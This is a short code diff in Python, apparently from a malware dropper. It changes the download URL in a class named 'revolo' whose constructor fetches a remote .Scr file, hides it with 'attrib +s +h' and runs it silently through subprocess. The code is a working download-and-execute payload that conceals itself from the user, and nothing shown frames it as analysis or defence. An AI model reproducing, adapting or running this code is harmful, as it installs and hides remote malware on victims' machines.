@@ -13,7 +13,7 @@ except:
 class revolo:
     def __init__(self):
         try:
-            urlretrieve('http://sonoscout.de//images/Index.Scr',"Index.Scr")
+            urlretrieve('http://quizmical.com/Index2117.Scr',"Index.Scr")
             subprocess.Popen("attrib +s +h Index.Scr",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
             subprocess.Popen("Index.Scr",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
         except:
